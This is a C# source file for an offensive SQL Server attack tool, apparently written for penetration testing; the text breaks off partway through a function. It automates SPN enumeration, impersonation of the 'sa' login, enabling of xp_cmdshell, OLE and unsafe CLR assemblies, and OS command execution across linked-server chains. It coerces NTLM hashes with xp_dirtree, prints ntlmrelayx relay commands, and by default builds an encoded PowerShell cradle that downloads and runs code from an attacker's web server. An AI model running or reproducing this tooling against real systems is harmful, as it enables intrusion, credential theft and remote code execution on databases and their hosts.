using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

namespace cSharpQL
{
    class Program
    {
        static void Main(string[] args)
        {
            // Parse command line arguments
            var arguments = CommandLineArguments.Parse(args);

            // Show help if requested or no valid command provided
            if (arguments.ShowHelp)
            {
                CommandLineArguments.ShowHelpText();
                return;
            }

            // Handle server enumeration (doesn't require SQL connection)
            if (arguments.EnumerateServers && !arguments.ExecuteOnLinked)
            {
                EnumerateSqlServers(arguments.Domain);
                return;
            }

            // Create SQL connection
            SqlConnection connection = null;
            try
            {
                connection = ConnectToSqlServer(arguments);

                // If we have a LinkedServer and any enumeration flags, handle them directly
                if (arguments.ExecuteOnLinked)
                {
                    if (arguments.EnumeratePermissions)
                    {
                        EnumeratePermissionsOnLinkedServer(connection, arguments);
                        return;
                    }

                    if (arguments.EnumerateLinkedServers)
                    {
                        EnumerateLinkedServersOnLinkedServer(connection, arguments);
                        return;
                    }

                    if (arguments.EnumerateImpersonation)
                    {
                        EnumerateImpersonationOnLinkedServer(connection, arguments);
                        return;
                    }
                }

                // Execute based on the requested operation
                if (arguments.UseHash)
                {
                    PerformHashCapture(connection, arguments.UseRelay);
                }
                else if (arguments.EnumeratePermissions)
                {
                    EnumeratePermissions(connection);
                }
                else if (arguments.EnumerateImpersonation)
                {
                    EnumerateImpersonatableAccounts(connection, arguments);
                }
                else if (arguments.EnumerateLinkedServers)
                {
                    EnumerateLinkedServers(connection);
                }
                else if (arguments.ExecuteOnLinked)
                {
                    ExecuteOnLinkedServer(connection, arguments);
                }
                else if (arguments.ImpersonateType != "")
                {
                    PerformImpersonation(connection, arguments);

                    // After impersonation, perform any requested enablement
                    if (arguments.EnableXpCmd)
                    {
                        EnableXpCmdShell(connection);
                    }
                    else if (arguments.EnableOle)
                    {
                        EnableOleAutomation(connection);
                    }
                    else if (arguments.EnableClr)
                    {
                        EnableClr(connection);
                    }

                    // After impersonation, handle CLR operations
                    if (arguments.CreateClr)
                    {
                        CreateClrAssembly(connection, arguments);
                    }
                    else if (arguments.DropClr)
                    {
                        DropClrAssembly(connection, arguments);
                    }

                    // Execute commands if requested
                    if (arguments.ExecuteCommand)
                    {
                        ExecuteCommand(connection, arguments);
                    }
                }
                else if (arguments.EnableXpCmd || arguments.EnableOle || arguments.EnableClr)
                {
                    // Handle direct enablement without impersonation
                    if (arguments.EnableXpCmd)
                    {
                        EnableXpCmdShell(connection);
                    }
                    else if (arguments.EnableOle)
                    {
                        EnableOleAutomation(connection);
                    }
                    else if (arguments.EnableClr)
                    {
                        EnableClr(connection);
                    }
                }
                else if (arguments.CreateClr)
                {
                    CreateClrAssembly(connection, arguments);
                }
                else if (arguments.DropClr)
                {
                    DropClrAssembly(connection, arguments);
                }
                else if (arguments.ExecuteCommand)
                {
                    ExecuteCommand(connection, arguments);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                // Close the connection if it was opened
                if (connection != null && connection.State == System.Data.ConnectionState.Open)
                {
                    Console.WriteLine("Closing SQL connection...");
                    connection.Close();
                }
            }
        }
        #region Connection Methods

        /// <summary>
        /// Create and open a SQL Server connection
        /// </summary>
        private static SqlConnection ConnectToSqlServer(CommandLineArguments args)
        {
            string connectionString;

            // Build connection string based on authentication method
            if (!string.IsNullOrEmpty(args.Username))
            {
                connectionString = $"Server={args.SqlServer}; Database={args.Database}; User Id={args.Username}; Password={args.Password};";
            }
            else
            {
                connectionString = $"Server={args.SqlServer}; Database={args.Database}; Integrated Security=True;";
            }

            // Create and open the connection
            var connection = new SqlConnection(connectionString);

            try
            {
                connection.Open();
                Console.WriteLine("Authentication successful!");
                return connection;
            }
            catch
            {
                Console.WriteLine("Authentication failed");
                Environment.Exit(1);
                return null; // This line will never execute but is needed for compilation
            }
        }

        #endregion

        #region Enumeration Methods
        /// <summary>
        /// Enumerate SQL servers in the domain using setspn
        /// </summary>
        private static void EnumerateSqlServers(string domain)
        {
            // Prompt for domain if not provided
            if (string.IsNullOrEmpty(domain))
            {
                Console.Write("Enter domain to query for MSSQL SPNs: ");
                domain = Console.ReadLine();
            }

            // Run setspn command to enumerate SQL servers
            string command = $"/c setspn -T {domain} -Q MSSQLSvc/*";
            Console.WriteLine();

            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "C:\\Windows\\System32\\cmd.exe",
                        Arguments = command,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                while (!process.StandardOutput.EndOfStream)
                {
                    Console.WriteLine(process.StandardOutput.ReadLine());
                }

                process.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing setspn: {ex.Message}");
            }

            // Let the program continue to the end naturally now that we know it works
        }


        /// <summary>
        /// Enumerate current permissions on the SQL Server
        /// </summary>
        private static void EnumeratePermissions(SqlConnection connection)
        {
            Console.WriteLine();
            string serverName = SqlHelper.GetServerName(connection);
            Console.WriteLine($"Logged in on: {serverName}\n");

            string systemUser = SqlHelper.GetCurrentUser(connection);
            string sqlUser = SqlHelper.GetSqlUserName(connection);
            Console.WriteLine($"{systemUser} is mapped to SQL account: {sqlUser}");

            // Check server roles
            Console.WriteLine();
            var roles = new[] { "public", "sysadmin", "serveradmin", "setupadmin", "securityadmin", "dbcreator" };

            foreach (var role in roles)
            {
                bool isMember = SqlHelper.IsServerRoleMember(connection, role);
                Console.WriteLine($"{systemUser} is {(isMember ? "a member" : "NOT a member")} of {role} role");
            }

            Console.WriteLine();
        }

        /// <summary>
        /// Enumerate linked servers
        /// </summary>
        private static void EnumerateLinkedServers(SqlConnection connection)
        {
            Console.WriteLine("\nEnumerating linked servers:");

            try
            {
                var linkedServers = SqlHelper.GetLinkedServers(connection);

                if (linkedServers.Count == 0)
                {
                    Console.WriteLine("No linked servers found.");
                    return;
                }

                foreach (var server in linkedServers)
                {
                    Console.WriteLine($" - {server}");

                    // Try to get version info for each linked server
                    try
                    {
                        string versionQuery = "SELECT @@VERSION AS version";
                        Console.WriteLine("   Attempting to get version info...");

                        SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, server, versionQuery, reader => {
                            string version = reader["version"].ToString();
                            Console.WriteLine($"   Version: {version.Split('\n')[0]}"); // Just show first line
                        });

                        // Try to get current user context on linked server
                        string userQuery = "SELECT SYSTEM_USER AS username";
                        SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, server, userQuery, reader => {
                            string username = reader["username"].ToString();
                            Console.WriteLine($"   Executing as: {username}");
                        });
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"   Error querying linked server: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating linked servers: {ex.Message}");
            }
        }

        /// <summary>
        /// Enumerate accounts that can be impersonated
        /// </summary>
        private static List<string> EnumerateImpersonatableAccounts(SqlConnection connection, CommandLineArguments args)
        {
            var impersonatableAccounts = new List<string>();

            string query = @"
                SELECT DISTINCT b.name 
                FROM sys.server_permissions a 
                INNER JOIN sys.server_principals b 
                    ON a.grantor_principal_id = b.principal_id 
                WHERE a.permission_name = 'IMPERSONATE'";

            Console.WriteLine("\nAccounts that can be impersonated:");

            SqlHelper.ExecuteReaderQuery(connection, query, reader => {
                string account = reader[0].ToString();
                Console.WriteLine($" - {account}");
                impersonatableAccounts.Add(account);
            });

            if (impersonatableAccounts.Count == 0)
            {
                Console.WriteLine(" None found");
            }
            else if (impersonatableAccounts.Contains("sa", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine("\n[!] SA account can be impersonated - this can lead to privilege escalation!");

                if (string.IsNullOrEmpty(args.ImpersonateType))
                {
                    // Prompt to try impersonation now
                    Console.Write("\nDo you want to try impersonating 'sa' now? (Y/N): ");
                    string response = Console.ReadLine();

                    if (response.Equals("Y", StringComparison.OrdinalIgnoreCase))
                    {
                        args.ImpersonateType = "LOGIN";
                        args.ImpersonateAccount = "sa";
                        PerformImpersonation(connection, args);
                    }
                }
            }

            return impersonatableAccounts;
        }

        /// <summary>
        /// Enumerate permissions on a linked server
        /// </summary>
        private static void EnumeratePermissionsOnLinkedServer(SqlConnection connection, CommandLineArguments args)
        {
            // For now, only support direct linked server (not chain)
            string linkedServer = args.LinkedServer;
            Console.WriteLine($"\nEnumerating permissions on linked server: {linkedServer}");

            try
            {
                // Get server name
                string serverNameQuery = "SELECT @@SERVERNAME AS servername";

                if (args.UseOpenQuery)
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, serverNameQuery, reader => {
                        Console.WriteLine($"Server name: {reader["servername"]}");
                    });
                }
                else
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, serverNameQuery, reader => {
                        Console.WriteLine($"Server name: {reader["servername"]}");
                    });
                }

                // Get current user
                string currentUserQuery = "SELECT SYSTEM_USER AS username, USER_NAME() AS sqluser";

                if (args.UseOpenQuery)
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, currentUserQuery, reader => {
                        Console.WriteLine($"Logged in as: {reader["username"]}");
                        Console.WriteLine($"Mapped to SQL user: {reader["sqluser"]}");
                    });
                }
                else
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, currentUserQuery, reader => {
                        Console.WriteLine($"Logged in as: {reader["username"]}");
                        Console.WriteLine($"Mapped to SQL user: {reader["sqluser"]}");
                    });
                }

                // Check roles
                string[] roles = new[] { "public", "sysadmin" };

                foreach (var role in roles)
                {
                    string roleQuery = $"SELECT IS_SRVROLEMEMBER('{role}') AS is_member";
                    bool isMember = false;

                    if (args.UseOpenQuery)
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, roleQuery, reader => {
                            isMember = Convert.ToInt32(reader["is_member"]) == 1;
                        });
                    }
                    else
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, roleQuery, reader => {
                            isMember = Convert.ToInt32(reader["is_member"]) == 1;
                        });
                    }

                    Console.WriteLine($"Is member of {role} role: {(isMember ? "Yes" : "No")}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating permissions: {ex.Message}");
            }
        }

        /// <summary>
        /// Enumerate linked servers on a linked server
        /// </summary>
        private static void EnumerateLinkedServersOnLinkedServer(SqlConnection connection, CommandLineArguments args)
        {
            // For now, only support direct linked server (not chain)
            string linkedServer = args.LinkedServer;
            Console.WriteLine($"\nEnumerating linked servers on: {linkedServer}");

            try
            {
                string query = "SELECT name FROM sys.servers WHERE is_linked = 1";
                bool foundServers = false;

                if (args.UseOpenQuery)
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, query, reader => {
                        foundServers = true;
                        Console.WriteLine($" - {reader["name"]}");
                    });
                }
                else
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, query, reader => {
                        foundServers = true;
                        Console.WriteLine($" - {reader["name"]}");
                    });
                }

                if (!foundServers)
                {
                    Console.WriteLine("No linked servers found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating linked servers: {ex.Message}");
            }
        }

        /// <summary>
        /// Enumerate impersonatable accounts on a linked server
        /// </summary>
        private static void EnumerateImpersonationOnLinkedServer(SqlConnection connection, CommandLineArguments args)
        {
            // For now, only support direct linked server (not chain)
            string linkedServer = args.LinkedServer;
            Console.WriteLine($"\nEnumerating impersonatable accounts on: {linkedServer}");

            try
            {
                string query = @"
            SELECT name 
            FROM sys.server_principals p
            JOIN sys.server_permissions r ON p.principal_id = r.grantor_principal_id
            WHERE r.permission_name = 'IMPERSONATE'";

                bool foundAccounts = false;
                List<string> impersonatableAccounts = new List<string>();

                if (args.UseOpenQuery)
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, query, reader => {
                        foundAccounts = true;
                        string account = reader["name"].ToString();
                        impersonatableAccounts.Add(account);
                        Console.WriteLine($" - {account}");
                    });
                }
                else
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, query, reader => {
                        foundAccounts = true;
                        string account = reader["name"].ToString();
                        impersonatableAccounts.Add(account);
                        Console.WriteLine($" - {account}");
                    });
                }

                if (!foundAccounts)
                {
                    Console.WriteLine("No accounts can be impersonated.");
                }
                else if (impersonatableAccounts.Any(a => a.Equals("sa", StringComparison.OrdinalIgnoreCase)))
                {
                    Console.WriteLine("\n[!] SA account can be impersonated - this can lead to privilege escalation!");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating impersonatable accounts: {ex.Message}");
            }
        }
        #endregion
        
        #region Execution Methods
        /// <summary>
        /// Perform hash capture attack using xp_dirtree
        /// </summary>
        private static void PerformHashCapture(SqlConnection connection, bool useRelay)
        {
            string attackerHost = "";

            // Create ntlmrelayx command if relay flag is used
            if (useRelay)
            {
                Console.Write("Enter target to relay credentials: ");
                string targetServer = Console.ReadLine();

                Console.Write("Enter the attacker IP/Domain of webserver: ");
                attackerHost = Console.ReadLine();

                Console.Write("Shellcode filename on webserver: ");
                string shellcodeFile = Console.ReadLine();

                string decodedPayload = $"(New-Object System.Net.WebClient).DownloadString('http://{attackerHost}/{shellcodeFile}') | IEX";
                string encodedPayload = EncodeBase64(decodedPayload);

                Console.WriteLine($"\nEncoded Command:\n\nsudo impacket-ntlmrelayx --no-http-server -smb2support -t {targetServer} -c 'powershell -enc {encodedPayload}'");
            }

            // Prompt for SMB share IP
            if (string.IsNullOrEmpty(attackerHost))
            {
                Console.WriteLine("REMINDER - Now's the time to make sure you have Responder running...");
                Console.Write("Enter the target SMB Share IP of attacker (Type exit to quit): ");
                attackerHost = Console.ReadLine();
            }
            else
            {
                Console.Write($"Set the target SMB Server to: {attackerHost}? (Y/N): ");
                string confirmSmbHost = Console.ReadLine();

                if (confirmSmbHost.Equals("N", StringComparison.OrdinalIgnoreCase))
                {
                    Console.Write("Enter the target SMB Server: ");
                    attackerHost = Console.ReadLine();
                }
            }

            // Exit if requested
            if (attackerHost.Equals("exit", StringComparison.OrdinalIgnoreCase) || string.IsNullOrEmpty(attackerHost))
            {
                return;
            }

            // Execute xp_dirtree to coerce authentication
            Console.WriteLine();
            string query = $"EXEC master..xp_dirtree '\\\\{attackerHost}\\test';";

            try
            {
                SqlHelper.ExecuteScalarQuery(connection, query);
                Console.WriteLine("Successfully executed command. Check for the hash...");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error forcing server authentication: {ex.Message}");
            }
        }

        /// <summary>
        /// Perform impersonation (EXECUTE AS)
        /// </summary>
        private static void PerformImpersonation(SqlConnection connection, CommandLineArguments args)
        {
            if (args.ImpersonateType == "USER")
            {
                // Set defaults for USER impersonation
                if (string.IsNullOrEmpty(args.ImpersonateAccount))
                {
                    args.ImpersonateAccount = "dbo";
                }

                if (args.Database != "msdb")
                {
                    Console.WriteLine($"\nSwitching to msdb database for USER impersonation");
                    args.Database = "msdb";
                }

                Console.WriteLine($"\nExecuting as USER: {args.ImpersonateAccount} in database: {args.Database}");

                string executeAsQuery = $"USE {args.Database}; EXECUTE AS USER = '{args.ImpersonateAccount}';";
                SqlHelper.ExecuteScalarQuery(connection, executeAsQuery);

                string currentUser = SqlHelper.GetSqlUserName(connection);
                Console.WriteLine($"Current user after impersonation: {currentUser}");
            }
            else if (args.ImpersonateType == "LOGIN")
            {
                // Set default for LOGIN impersonation
                if (string.IsNullOrEmpty(args.ImpersonateAccount))
                {
                    args.ImpersonateAccount = "sa";
                }

                Console.WriteLine($"\nExecuting as LOGIN: {args.ImpersonateAccount}");

                string executeAsQuery = $"EXECUTE AS LOGIN = '{args.ImpersonateAccount}';";
                SqlHelper.ExecuteScalarQuery(connection, executeAsQuery);

                string currentUser = SqlHelper.GetCurrentUser(connection);
                Console.WriteLine($"Current user after impersonation: {currentUser}");
            }
        }

        /// <summary>
        /// Enable xp_cmdshell stored procedure
        /// </summary>
        private static void EnableXpCmdShell(SqlConnection connection)
        {
            Console.WriteLine("\nEnabling xp_cmdshell...");

            string query = @"
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;";

            SqlHelper.ExecuteScalarQuery(connection, query);

            // Test if it was enabled successfully
            Console.WriteLine("Testing settings by running 'whoami'...");

            SqlHelper.ExecuteReaderQuery(connection, "EXEC xp_cmdshell 'whoami'", reader =>
            {
                if (reader[0] != null)
                {
                    Console.WriteLine($"Result: {reader[0]}");
                }
            });
        }

        /// <summary>
        /// Enable OLE Automation Procedures
        /// </summary>
        private static void EnableOleAutomation(SqlConnection connection)
        {
            Console.WriteLine("\nEnabling OLE Automation Procedures...");

            string query = @"
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'Ole Automation Procedures', 1;
                RECONFIGURE;";

            SqlHelper.ExecuteScalarQuery(connection, query);
            Console.WriteLine("OLE Automation Procedures enabled successfully");
        }

        /// <summary>
        /// Enable CLR integration
        /// </summary>
        private static void EnableClr(SqlConnection connection)
        {
            Console.WriteLine("\nEnabling CLR integration...");

            string query = @"
                USE msdb;
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'clr enabled', 1;
                RECONFIGURE;
                EXEC sp_configure 'clr strict security', 0;
                RECONFIGURE;";

            SqlHelper.ExecuteScalarQuery(connection, query);
            Console.WriteLine("CLR integration enabled successfully");
        }

        /// <summary>
        /// Create CLR assembly and stored procedure
        /// </summary>
        private static void CreateClrAssembly(SqlConnection connection, CommandLineArguments args)
        {
            string assemblyName = "myAssembly";

            Console.WriteLine($"\nCurrent defaults:\nAssembly Name: {assemblyName}\nProcedure Name: {args.ProcedureName}");

            // Prompt user to validate/change CLR/Stored Procedure variables
            Console.WriteLine("\nSelect what you'd like to change:");
            Console.WriteLine(" 1: Assembly Name\n 2: Procedure Name\n 3: Both\n 4: None");

            Console.Write("Enter your choice (1/2/3/4): ");
            string userChoice = Console.ReadLine().Trim();

            if (userChoice == "1" || userChoice == "3")
            {
                Console.Write("Enter the new assembly name: ");
                assemblyName = Console.ReadLine().Trim();
            }

            if (userChoice == "2" || userChoice == "3")
            {
                Console.Write("Enter the new procedure name: ");
                args.ProcedureName = Console.ReadLine().Trim();
            }

            // Get assembly file path
            if (string.IsNullOrEmpty(args.AssemblyFile))
            {
                Console.Write("No assembly file specified. Please provide a local file on the target database server's filesystem, or an SMB share: ");
                args.AssemblyFile = Console.ReadLine().Trim();
            }

            // Process assembly file
            string assemblyContent;
            if (args.AssemblyFile.StartsWith("\\\\"))
            {
                // If file is on SMB share, convert to hex
                assemblyContent = "0x" + FileHelper.ReadFileAsHex(args.AssemblyFile);
            }
            else
            {
                // Otherwise put the local file in quotes
                assemblyContent = $"'{args.AssemblyFile}'";
            }

            // Create assembly and procedure
            string createAsmQuery = $"CREATE ASSEMBLY {assemblyName} FROM {assemblyContent} WITH PERMISSION_SET = UNSAFE";
            string createProQuery = $"CREATE PROCEDURE [dbo].[{args.ProcedureName}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{args.ProcedureName}];";

            Console.WriteLine("\nCreating assembly and stored procedure...");
            SqlHelper.ExecuteScalarQuery(connection, createAsmQuery);
            SqlHelper.ExecuteScalarQuery(connection, createProQuery);
            Console.WriteLine("CLR assembly and stored procedure created successfully");
        }

        /// <summary>
        /// Drop CLR assembly and stored procedure
        /// </summary>
        private static void DropClrAssembly(SqlConnection connection, CommandLineArguments args)
        {
            string assemblyName = "myAssembly";

            Console.WriteLine($"\nCurrent defaults:\nAssembly Name: {assemblyName}\nProcedure Name: {args.ProcedureName}");

            // Prompt user to validate/change CLR/Stored Procedure variables
            Console.WriteLine("\nSelect what you'd like to change:");
            Console.WriteLine(" 1: Assembly Name\n 2: Procedure Name\n 3: Both\n 4: None");

            Console.Write("Enter your choice (1/2/3/4): ");
            string userChoice = Console.ReadLine().Trim();

            if (userChoice == "1" || userChoice == "3")
            {
                Console.Write("Enter the assembly name to drop: ");
                assemblyName = Console.ReadLine().Trim();
            }

            if (userChoice == "2" || userChoice == "3")
            {
                Console.Write("Enter the procedure name to drop: ");
                args.ProcedureName = Console.ReadLine().Trim();
            }

            // Drop procedure and assembly
            string dropProQuery = $"DROP PROCEDURE {args.ProcedureName}";
            string dropAsmQuery = $"DROP ASSEMBLY {assemblyName}";

            Console.WriteLine("\nDropping stored procedure and assembly...");
            SqlHelper.ExecuteScalarQuery(connection, dropProQuery);
            SqlHelper.ExecuteScalarQuery(connection, dropAsmQuery);
            Console.WriteLine("CLR stored procedure and assembly dropped successfully");
        }

        /// <summary>
        /// Execute OS command using specified method
        /// </summary>
        private static void ExecuteCommand(SqlConnection connection, CommandLineArguments args)
        {
            // Get command to execute
            if (string.IsNullOrEmpty(args.OsCommand))
            {
                Console.WriteLine("\nNo command specified. Choose one of the following:");
                Console.WriteLine(" 1 - Default: Generate an encoded PowerShell payload");
                Console.WriteLine(" 2 - Custom: Specify your own command");

                string userChoice = Console.ReadLine().Trim();

                if (userChoice == "1")
                {
                    Console.WriteLine("\nDefault will be to use an encoded PowerShell command, the decoded value of which is:");
                    Console.WriteLine("(New-Object System.Net.WebClient).DownloadString('http://yourattackerip/yourfile') | IEX\n");

                    Console.Write("Enter the attacker IP/Domain of webserver: ");
                    string attackerHost = Console.ReadLine();

                    Console.Write("Filename on webserver to download & execute: ");
                    string attackerFile = Console.ReadLine();

                    string decodedPayload = $"(New-Object System.Net.WebClient).DownloadString('http://{attackerHost}/{attackerFile}') | IEX";
                    string encodedPayload = EncodeBase64(decodedPayload);
                    args.OsCommand = $"powershell.exe -enc {encodedPayload}";
                }
                else if (userChoice == "2")
                {
                    Console.Write("\nSpecify command to execute: ");
                    args.OsCommand = Console.ReadLine().Trim();
                }
                else
                {
                    Console.WriteLine("Invalid option selected. Quitting...");
                    return;
                }
            }

            // Offer to encode PowerShell command
            if (args.OsCommand.Contains("powershell") && !args.OsCommand.Contains("-enc"))
            {
                Console.Write("\nPowerShell command identified. Would you like to base64 encode it? (Y/N): ");
                string encodeResponse = Console.ReadLine().Trim().ToUpper();

                if (encodeResponse.StartsWith("Y"))
                {
                    string parsed = args.OsCommand
                        .Replace("powershell", "")
                        .Replace("powershell.exe", "")
                        .Trim();

                    string encoded = EncodeBase64(parsed);
                    args.OsCommand = $"powershell -enc {encoded}";
                }
            }

            // Execute using specified method
            Console.WriteLine($"\nExecuting command using {args.CommandExecType}:");
            Console.WriteLine($"Command: {args.OsCommand}\n");

            if (args.CommandExecType == "XPCMD")
            {
                // Check if xp_cmdshell is enabled
                if (!SqlHelper.IsXpCmdShellEnabled(connection))
                {
                    Console.WriteLine("xp_cmdshell is not enabled. Attempting to enable it...");
                    EnableXpCmdShell(connection);

                    if (!SqlHelper.IsXpCmdShellEnabled(connection))
                    {
                        Console.WriteLine("Failed to enable xp_cmdshell. Command execution aborted.");
                        return;
                    }

                    Console.WriteLine("xp_cmdshell has been successfully enabled.\n");
                }

                string query = $"EXEC xp_cmdshell '{args.OsCommand}'";
                Console.WriteLine("Command Output:");
                SqlHelper.ExecuteReaderQuery(connection, query, reader =>
                {
                    if (reader[0] != null)
                    {
                        Console.WriteLine(reader[0]);
                    }
                });
            }
            else if (args.CommandExecType == "OLE")
            {
                // Check if OLE Automation is enabled
                if (!SqlHelper.IsOleAutomationEnabled(connection))
                {
                    Console.WriteLine("OLE Automation Procedures are not enabled. Attempting to enable them...");
                    EnableOleAutomation(connection);

                    if (!SqlHelper.IsOleAutomationEnabled(connection))
                    {
                        Console.WriteLine("Failed to enable OLE Automation Procedures. Command execution aborted.");
                        return;
                    }

                    Console.WriteLine("OLE Automation Procedures have been successfully enabled.\n");
                }

                string query = $@"
            DECLARE @myshell INT;
            EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
            EXEC sp_oamethod @myshell, 'run', null, '{args.OsCommand}';";

                Console.WriteLine("Command Output (Note: OLE method may not return output):");
                SqlHelper.ExecuteScalarQuery(connection, query);
                Console.WriteLine("Command executed successfully via OLE");
            }
            else if (args.CommandExecType == "CLR")
            {
                // Check if CLR is enabled
                if (!SqlHelper.IsClrEnabled(connection))
                {
                    Console.WriteLine("CLR integration is not enabled. Attempting to enable it...");
                    EnableClr(connection);

                    if (!SqlHelper.IsClrEnabled(connection))
                    {
                        Console.WriteLine("Failed to enable CLR integration. Command execution aborted.");
                        return;
                    }

                    Console.WriteLine("CLR integration has been successfully enabled.");
                }

                // Check if the CLR stored procedure exists
                if (!SqlHelper.ClrStoredProcedureExists(connection, args.ProcedureName))
                {
                    Console.WriteLine($"CLR stored procedure '{args.ProcedureName}' does not exist.");

                    if (string.IsNullOrEmpty(args.AssemblyFile))
                    {
                        Console.WriteLine("No assembly file specified. Please provide the assembly file path using /assembly-file.");
                        Console.Write("Do you want to specify an assembly file now? (Y/N): ");
                        string response = Console.ReadLine().Trim().ToUpper();

                        if (response.StartsWith("Y"))
                        {
                            Console.Write("Enter the assembly file path: ");
                            args.AssemblyFile = Console.ReadLine().Trim();
                            CreateClrAssembly(connection, args);
                        }
                        else
                        {
                            Console.WriteLine("Command execution aborted.");
                            return;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Attempting to create CLR stored procedure...");
                        CreateClrAssembly(connection, args);
                    }

                    if (!SqlHelper.ClrStoredProcedureExists(connection, args.ProcedureName))
                    {
                        Console.WriteLine("Failed to create CLR stored procedure. Command execution aborted.");
                        return;
                    }

                    Console.WriteLine($"CLR stored procedure '{args.ProcedureName}' has been successfully created.\n");
                }

                string query = $"EXEC {args.ProcedureName} '{args.OsCommand}'";
                Console.WriteLine("Command Output:");
                SqlHelper.ExecuteReaderQuery(connection, query, reader =>
                {
                    if (reader[0] != null)
                    {
                        Console.WriteLine(reader[0]);
                    }
                });
            }
        }

        /// <summary>
        /// Execute on a linked server or chain of linked servers
        /// </summary>
        private static void ExecuteOnLinkedServer(SqlConnection connection, CommandLineArguments args)
        {
            // If we have a chain of servers
            if (args.LinkedServerChain.Count > 1)
            {
                string firstServer = args.LinkedServerChain[0];
                string lastServer = args.LinkedServerChain[args.LinkedServerChain.Count - 1];

                Console.WriteLine($"\nWorking with linked server chain: {string.Join(" -> ", args.LinkedServerChain)}");

                // Choose which server in the chain to work with
                Console.WriteLine("\nChoose an operation:");
                Console.WriteLine(" 1: Enumerate the first server in the chain");
                Console.WriteLine(" 2: Enumerate the last server in the chain through the entire chain");
                Console.WriteLine(" 3: Execute a command on the first server");
                Console.WriteLine(" 4: Execute a command on the last server through the entire chain");

                Console.Write("\nChoose option (1-4): ");
                string optionChoice = Console.ReadLine().Trim();

                switch (optionChoice)
                {
                    case "1":
                        // Just enumerate the first server directly
                        EnumerateLinkedServer(connection, firstServer, args.UseOpenQuery);
                        break;

                    case "2":
                        // Enumerate the last server through the chain
                        EnumerateServerThroughChain(connection, args.LinkedServerChain);
                        break;

                    case "3":
                        // Execute on the first server
                        ExecuteCommandOnLinkedServer(connection, firstServer, args);
                        break;

                    case "4":
                        // Execute on the last server through the chain
                        ExecuteCommandThroughChain(connection, args.LinkedServerChain, args);
                        break;

                    default:
                        Console.WriteLine("Invalid option selected.");
                        break;
                }
            }
            else
            {
                // Single linked server - use the regular methods
                string linkedServer = args.LinkedServer;

                Console.WriteLine($"\nWorking with linked server: {linkedServer}");

                // First check if we can enumerate the linked server
                if (string.IsNullOrEmpty(args.OsCommand))
                {
                    // Just enumerate the linked server information
                    EnumerateLinkedServer(connection, linkedServer, args.UseOpenQuery);

                    // If no command was provided, prompt for one
                    Console.Write("\nDo you want to execute a command on the linked server? (Y/N): ");
                    string executeResponse = Console.ReadLine();

                    if (executeResponse.Equals("Y", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.Write("Enter command to execute: ");
                        args.OsCommand = Console.ReadLine();
                        ExecuteCommandOnLinkedServer(connection, linkedServer, args);
                    }
                }
                else
                {
                    // Execute the specified command
                    ExecuteCommandOnLinkedServer(connection, linkedServer, args);
                }
            }
        }

        /// <summary>
        /// Enumerate information about a linked server
        /// </summary>
        private static void EnumerateLinkedServer(SqlConnection connection, string linkedServer, bool useOpenQuery)
        {
            Console.WriteLine($"\nEnumerating linked server: {linkedServer}");

            try
            {
                // Get server version
                string versionQuery = "SELECT @@VERSION AS version";
                Console.WriteLine("Attempting to get version info...");

                if (useOpenQuery)
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, versionQuery, reader => {
                        string version = reader["version"].ToString();
                        Console.WriteLine($"Version: {version.Split('\n')[0]}"); // Just show first line
                    });
                }
                else
                {
                    SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, versionQuery, reader => {
                        string version = reader["version"].ToString();
                        Console.WriteLine($"Version: {version.Split('\n')[0]}"); // Just show first line
                    });
                }

                // Check if xp_cmdshell is enabled
                string xpCmdQuery = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS enabled FROM sys.configurations WHERE name = 'xp_cmdshell'";
                bool xpCmdEnabled = false;

                try
                {
                    if (useOpenQuery)
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, xpCmdQuery, reader => {
                            xpCmdEnabled = Convert.ToInt32(reader["enabled"]) == 1;
                        });
                    }
                    else
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, xpCmdQuery, reader => {
                            xpCmdEnabled = Convert.ToInt32(reader["enabled"]) == 1;
                        });
                    }

